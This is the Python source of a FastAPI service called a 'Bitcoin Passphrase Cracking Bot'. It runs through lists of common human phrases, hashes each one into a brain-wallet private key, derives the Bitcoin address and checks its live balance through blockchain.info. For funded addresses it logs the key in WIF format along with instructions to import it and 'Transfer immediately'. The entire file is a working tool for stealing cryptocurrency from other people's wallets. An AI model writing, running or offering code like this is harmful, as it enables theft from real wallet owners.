from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional
import uuid
from datetime import datetime
import asyncio
import hashlib
import ecdsa
import base58
import requests
import time
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Global state for cracking process
cracking_state = {
    "is_running": False,
    "current_passphrase": "",
    "total_attempts": 0,
    "found_keys": [],
    "start_time": None,
    "progress": 0,
    "checked_passphrases": set(),  # In-memory cache for faster lookup
    "passphrase_generator": None
}

# Define Models
class CrackingResult(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    passphrase: str
    private_key: str
    bitcoin_address: str
    balance: float
    discovered_at: datetime = Field(default_factory=datetime.utcnow)

class CrackingAttempt(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    passphrase: str
    private_key: str
    bitcoin_address: str
    balance: float
    attempted_at: datetime = Field(default_factory=datetime.utcnow)

class CheckedPassphrase(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    passphrase: str
    checked_at: datetime = Field(default_factory=datetime.utcnow)

class CrackingStatus(BaseModel):
    is_running: bool
    current_passphrase: str
    total_attempts: int
    found_keys: int
    start_time: Optional[datetime]
    progress: float

# Bitcoin cryptography functions
def passphrase_to_private_key(passphrase: str) -> str:
    """Convert passphrase to private key using SHA-256 (like bitaddress.org)"""
    sha256_hash = hashlib.sha256(passphrase.encode('utf-8')).digest()
    return sha256_hash.hex()

def private_key_to_bitcoin_address(private_key_hex: str) -> str:
    """Convert private key to Bitcoin address"""
    try:
        # Convert hex private key to bytes
        private_key = bytes.fromhex(private_key_hex)
        
        # Generate public key using secp256k1
        sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
        vk = sk.verifying_key
        public_key = bytes.fromhex("04") + vk.to_string()
        
        # SHA-256 hash of public key
        sha256_bpk = hashlib.sha256(public_key).digest()
        
        # RIPEMD-160 hash
        ripemd160_bpk = hashlib.new('ripemd160', sha256_bpk).digest()
        
        # Add network byte (0x00 for mainnet)
        network_byte = b'\x00'
        network_bpk = network_byte + ripemd160_bpk
        
        # Double SHA-256 for checksum
        sha256_nbpk = hashlib.sha256(network_bpk).digest()
        sha256_2_nbpk = hashlib.sha256(sha256_nbpk).digest()
        checksum = sha256_2_nbpk[:4]
        
        # Final address
        binary_address = network_bpk + checksum
        address = base58.b58encode(binary_address)
        
        return address.decode()
    except Exception as e:
        logging.error(f"Error converting private key to address: {e}")
        return ""

async def check_bitcoin_balance(address: str) -> float:
    """Check Bitcoin balance using blockchain.info API"""
    try:
        url = f"https://blockchain.info/balance?active={address}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if address in data:
                # Balance is in satoshis, convert to BTC
                balance_satoshis = data[address]['final_balance']
                balance_btc = balance_satoshis / 100000000  # Convert satoshis to BTC
                return balance_btc
        return 0.0
    except Exception as e:
        logging.error(f"Error checking balance for {address}: {e}")
        return 0.0

# Advanced human-like passphrase generator
class HumanPassphraseGenerator:
    def __init__(self):
        self.current_category = 0
        self.current_index = 0
        self.categories = self._build_passphrase_categories()
    
    def _build_passphrase_categories(self):
        """Build comprehensive categories of human-like passphrases"""
        categories = []
        
        # 1. Simple emotional phrases
        emotional_phrases = [
            "i love you", "you are good", "i am happy", "life is good", "love wins",
            "i love bitcoin", "bitcoin is life", "crypto forever", "i love money",
            "money is power", "be happy", "stay positive", "never give up",
            "dream big", "live free", "i am rich", "success is mine", "i will win"
        ]
        categories.append(emotional_phrases)
        
        # 2. Personal information patterns
        personal_patterns = [
            "my name is john", "my birthday", "my secret", "my password",
            "my private key", "my wallet", "my bitcoin", "my crypto",
            "john doe", "jane smith", "mike jones", "sarah wilson",
            "my dog spot", "my cat fluffy", "my car", "my house"
        ]
        categories.append(personal_patterns)
        
        # 3. Bitcoin/Crypto related phrases
        crypto_phrases = [
            "bitcoin to the moon", "hodl forever", "satoshi nakamoto",
            "blockchain revolution", "crypto is king", "buy bitcoin",
            "digital gold", "financial freedom", "decentralized money",
            "peer to peer", "trust no one", "be your own bank",
            "magic internet money", "number go up", "diamond hands"
        ]
        categories.append(crypto_phrases)
        
        # 4. Common sentences and sayings
        common_sayings = [
            "the quick brown fox", "hello world", "good morning",
            "have a nice day", "see you later", "take care",
            "god bless you", "thank you", "please help me",
            "i need help", "save me", "protect me", "bless me"
        ]
        categories.append(common_sayings)
        
        # 5. Security-minded phrases
        security_phrases = [
            "keep it secret", "dont tell anyone", "this is private",
            "top secret", "classified", "confidential", "secure password",
            "safe and sound", "lock it up", "hide it well", "protect this"
        ]
        categories.append(security_phrases)
        
        # 6. Date and time patterns
        date_patterns = []
        for year in range(1980, 2025):
            date_patterns.extend([
                f"born in {year}", f"year {year}", f"since {year}",
                f"remember {year}", f"bitcoin {year}"
            ])
        for month in ["january", "february", "march", "april", "may", "june",
                     "july", "august", "september", "october", "november", "december"]:
            date_patterns.extend([
                f"born in {month}", f"{month} baby", f"love {month}"
            ])
        categories.append(date_patterns)
        
        # 7. Family and relationships
        family_phrases = [
            "i love mom", "i love dad", "my family", "my wife", "my husband",
            "my children", "my son", "my daughter", "my brother", "my sister",
            "mom and dad", "family first", "love my family", "my dear wife",
            "my beloved", "my sweetheart", "my darling", "my precious"
        ]
        categories.append(family_phrases)
        
        # 8. Motivational phrases
        motivational = [
            "never surrender", "keep fighting", "stay strong", "believe in yourself",
            "you can do it", "dont give up", "push forward", "reach for stars",
            "make it happen", "success awaits", "victory is mine", "i am winner",
            "conquer all", "unstoppable", "unlimited power", "infinite wealth"
        ]
        categories.append(motivational)
        
        # 9. Location-based phrases
        locations = [
            "new york city", "los angeles", "san francisco", "bitcoin city",
            "wall street", "silicon valley", "main street", "home sweet home",
            "united states", "america first", "god bless america", "land of free"
        ]
        categories.append(locations)
        
        # 10. Variations with numbers and symbols
        base_phrases = ["password", "secret", "private", "bitcoin", "crypto", "money"]
        variations = []
        for phrase in base_phrases:
            for num in range(1, 1000):
                variations.extend([
                    f"{phrase}{num}", f"{num}{phrase}", f"{phrase} {num}",
                    f"my {phrase}", f"{phrase} key", f"{phrase} wallet",
                    f"super {phrase}", f"secret {phrase}", f"private {phrase}"
                ])
        categories.append(variations)
        
        return categories
    
    def get_next_passphrase(self):
        """Get the next unique passphrase in sequence"""
        if self.current_category >= len(self.categories):
            # Generate more creative combinations when we run out
            return self._generate_creative_combination()
        
        current_list = self.categories[self.current_category]
        
        if self.current_index >= len(current_list):
            # Move to next category
            self.current_category += 1
            self.current_index = 0
            return self.get_next_passphrase()
        
        passphrase = current_list[self.current_index]
        self.current_index += 1
        return passphrase
    
    def _generate_creative_combination(self):
        """Generate creative combinations when basic lists are exhausted"""
        import random
        
        # Combine words from different categories
        adjectives = ["secret", "private", "hidden", "secure", "safe", "precious", "special"]
        nouns = ["key", "password", "wallet", "treasure", "gold", "money", "fortune"]
        verbs = ["keep", "save", "protect", "hide", "store", "guard", "secure"]
        
        patterns = [
            f"{random.choice(adjectives)} {random.choice(nouns)}",
            f"{random.choice(verbs)} my {random.choice(nouns)}",
            f"i {random.choice(verbs)} {random.choice(nouns)}",
            f"my {random.choice(adjectives)} {random.choice(nouns)}"
        ]
        
        return random.choice(patterns)

# Global passphrase generator instance
passphrase_generator = HumanPassphraseGenerator()

async def is_passphrase_already_checked(passphrase: str) -> bool:
    """Check if passphrase was already tested"""
    # First check in-memory cache for speed
    if passphrase in cracking_state["checked_passphrases"]:
        return True
    
    # Check in database for persistence
    existing = await db.checked_passphrases.find_one({"passphrase": passphrase})
    if existing:
        # Add to in-memory cache
        cracking_state["checked_passphrases"].add(passphrase)
        return True
    
    return False

async def mark_passphrase_as_checked(passphrase: str):
    """Mark passphrase as checked to avoid future duplicates"""
    # Add to in-memory cache
    cracking_state["checked_passphrases"].add(passphrase)
    
    # Store in database for persistence
    checked = CheckedPassphrase(passphrase=passphrase)
    await db.checked_passphrases.insert_one(checked.dict())

# Common passphrases to try
def generate_common_passphrases():
    """Generate list of common passphrases to try - DEPRECATED"""
    # This function is now deprecated in favor of HumanPassphraseGenerator
    # Keeping for backward compatibility
    passphrases = []
    
    # Simple words
    simple_words = [
        "password", "123456", "password123", "admin", "bitcoin", "satoshi",
        "nakamoto", "crypto", "blockchain", "wallet", "secret", "private",
        "key", "money", "cash", "gold", "silver", "test", "demo", "sample",
        "hello", "world", "user", "root", "god", "love", "family", "home",
        "work", "life", "happy", "lucky", "winner", "champion", "success"
    ]
    
    # Add simple words
    passphrases.extend(simple_words)
    
    # Add simple numbers
    for i in range(1, 1000):
        passphrases.append(str(i))
    
    # Add simple combinations
    for word in ["password", "bitcoin", "crypto", "wallet"]:
        for num in range(1, 100):
            passphrases.append(f"{word}{num}")
            passphrases.append(f"{num}{word}")
    
    # Add simple dates
    for year in range(1980, 2025):
        passphrases.append(str(year))
        passphrases.append(f"bitcoin{year}")
        passphrases.append(f"{year}bitcoin")
    
    return passphrases

async def crack_passphrases():
    """Main cracking function - now runs continuously without duplicates"""
    global cracking_state
    
    cracking_state["is_running"] = True
    cracking_state["start_time"] = datetime.utcnow()
    
    # Load existing checked passphrases into memory for faster lookup
    try:
        existing_checked = await db.checked_passphrases.find().to_list(None)
        for checked in existing_checked:
            cracking_state["checked_passphrases"].add(checked["passphrase"])
        logging.info(f"Loaded {len(existing_checked)} previously checked passphrases")
    except Exception as e:
        logging.error(f"Error loading checked passphrases: {e}")
    
    attempt_count = 0
    
    while cracking_state["is_running"]:
        try:
            # Get next unique passphrase
            passphrase = passphrase_generator.get_next_passphrase()
            
            # Skip if already checked
            if await is_passphrase_already_checked(passphrase):
                continue
            
            cracking_state["current_passphrase"] = passphrase
            attempt_count += 1
            cracking_state["total_attempts"] = attempt_count
            
            # Calculate progress (rough estimate since we're running indefinitely)
            # Show progress as attempts per hour or similar metric
            if cracking_state["start_time"]:
                elapsed_hours = (datetime.utcnow() - cracking_state["start_time"]).total_seconds() / 3600
                if elapsed_hours > 0:
                    cracking_state["progress"] = attempt_count / max(elapsed_hours, 0.1)  # attempts per hour
            
            # Generate private key from passphrase
            private_key = passphrase_to_private_key(passphrase)
            
            # Generate Bitcoin address
            bitcoin_address = private_key_to_bitcoin_address(private_key)
            
            if bitcoin_address:
                # Check balance
                balance = await check_bitcoin_balance(bitcoin_address)
                
                # Store attempt in database
                attempt = CrackingAttempt(
                    passphrase=passphrase,
                    private_key=private_key,
                    bitcoin_address=bitcoin_address,
                    balance=balance
                )
                await db.cracking_attempts.insert_one(attempt.dict())
                
                # Mark passphrase as checked to avoid future duplicates
                await mark_passphrase_as_checked(passphrase)
                
                # If balance > 0, it's a successful crack!
                if balance > 0:
                    # Prepare comprehensive transfer information
                    transfer_info = {
                        "passphrase": passphrase,
                        "private_key_hex": private_key,
                        "private_key_wif": private_key_to_wif(private_key),
                        "bitcoin_address": bitcoin_address,
                        "balance_btc": balance,
                        "balance_satoshis": int(balance * 100000000),
                        "discovery_time": datetime.utcnow().isoformat(),
                        "transfer_instructions": {
                            "method_1": "Import private key into wallet (Electrum, Bitcoin Core, etc.)",
                            "method_2": "Use online tools like blockchain.info to send transaction",
                            "private_key_format": "Use WIF format for most wallets",
                            "security_warning": "Transfer immediately to secure wallet"
                        }
                    }
                    
                    result = CrackingResult(
                        passphrase=passphrase,
                        private_key=private_key,
                        bitcoin_address=bitcoin_address,
                        balance=balance
                    )
                    await db.cracking_results.insert_one(result.dict())
                    cracking_state["found_keys"].append(transfer_info)
                    
                    logging.info(f"🎉 SUCCESS! Found private key with balance: {passphrase} -> {bitcoin_address} ({balance} BTC)")
                    logging.info(f"💰 Transfer Info: {json.dumps(transfer_info, indent=2)}")
                
                # Rate limiting to avoid API limits (but keep it fast)
                await asyncio.sleep(0.5)  # 2 requests per second max
                
        except Exception as e:
            logging.error(f"Error processing passphrase '{passphrase}': {e}")
            # Continue with next passphrase even if one fails
            continue
    
    cracking_state["is_running"] = False
    logging.info(f"Cracking stopped after {attempt_count} attempts")

def private_key_to_wif(private_key_hex: str) -> str:
    """Convert private key to Wallet Import Format (WIF)"""
    try:
        # Add version byte (0x80 for mainnet)
        extended_key = bytes.fromhex("80") + bytes.fromhex(private_key_hex)
        
        # Double SHA-256 hash
        hash1 = hashlib.sha256(extended_key).digest()
        hash2 = hashlib.sha256(hash1).digest()
        
        # Add checksum (first 4 bytes of hash)
        checksum = hash2[:4]
        final_key = extended_key + checksum
        
        # Encode in Base58
        wif = base58.b58encode(final_key)
        return wif.decode()
    except Exception as e:
        logging.error(f"Error converting to WIF: {e}")
        return ""

# API Routes
@api_router.get("/")
async def root():
    return {"message": "Bitcoin Passphrase Cracking Bot"}

@api_router.post("/start-cracking")
async def start_cracking(background_tasks: BackgroundTasks):
    if cracking_state["is_running"]:
        raise HTTPException(status_code=400, detail="Cracking is already running")
    
    # Reset state (but keep checked passphrases to avoid duplicates)
    cracking_state["total_attempts"] = 0
    cracking_state["found_keys"] = []
    cracking_state["progress"] = 0
    
    # Start cracking in background
    background_tasks.add_task(crack_passphrases)
    
    return {"message": "Continuous cracking started - will run indefinitely until stopped", "status": "running"}

@api_router.post("/stop-cracking")
async def stop_cracking():
    cracking_state["is_running"] = False
    return {"message": "Cracking stopped", "status": "stopped"}

@api_router.get("/status", response_model=CrackingStatus)
async def get_status():
    # Calculate attempts per hour for progress metric
    attempts_per_hour = 0
    if cracking_state["start_time"] and cracking_state["total_attempts"] > 0:
        elapsed_hours = (datetime.utcnow() - cracking_state["start_time"]).total_seconds() / 3600
        if elapsed_hours > 0:
            attempts_per_hour = cracking_state["total_attempts"] / elapsed_hours
    
    return CrackingStatus(
        is_running=cracking_state["is_running"],
        current_passphrase=cracking_state["current_passphrase"],
        total_attempts=cracking_state["total_attempts"],
        found_keys=len(cracking_state["found_keys"]),
        start_time=cracking_state["start_time"],
        progress=attempts_per_hour  # Now represents attempts per hour
    )

@api_router.get("/results", response_model=List[CrackingResult])
async def get_results():
    results = await db.cracking_results.find().to_list(1000)
    return [CrackingResult(**result) for result in results]

@api_router.get("/attempts")
async def get_attempts(limit: int = 100):
    attempts = await db.cracking_attempts.find().sort("attempted_at", -1).limit(limit).to_list(limit)
    return [CrackingAttempt(**attempt) for attempt in attempts]

@api_router.delete("/clear-data")
async def clear_data():
    await db.cracking_attempts.delete_many({})
    await db.cracking_results.delete_many({})
    await db.checked_passphrases.delete_many({})  # Also clear checked passphrases
    cracking_state["total_attempts"] = 0
    cracking_state["found_keys"] = []
    cracking_state["checked_passphrases"].clear()  # Clear in-memory cache
    return {"message": "All data cleared including checked passphrase history"}

@api_router.get("/stats")
async def get_stats():
    """Get comprehensive statistics"""
    total_attempts = await db.cracking_attempts.count_documents({})
    total_results = await db.cracking_results.count_documents({})
    total_checked = await db.checked_passphrases.count_documents({})
    
    # Calculate success rate
    success_rate = (total_results / max(total_attempts, 1)) * 100
    
    return {
        "total_attempts": total_attempts,
        "total_successful_cracks": total_results,
        "total_checked_passphrases": total_checked,
        "success_rate_percentage": success_rate,
        "current_session_attempts": cracking_state["total_attempts"],
        "is_running": cracking_state["is_running"]
    }

# Test endpoint to verify crypto functions
@api_router.post("/test-crypto")
async def test_crypto(passphrase: str):
    private_key = passphrase_to_private_key(passphrase)
    bitcoin_address = private_key_to_bitcoin_address(private_key)
    balance = await check_bitcoin_balance(bitcoin_address)
    wif_key = private_key_to_wif(private_key)
    
    return {
        "passphrase": passphrase,
        "private_key": private_key,
        "private_key_wif": wif_key,
        "bitcoin_address": bitcoin_address,
        "balance": balance,
        "already_checked": await is_passphrase_already_checked(passphrase)
    }

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()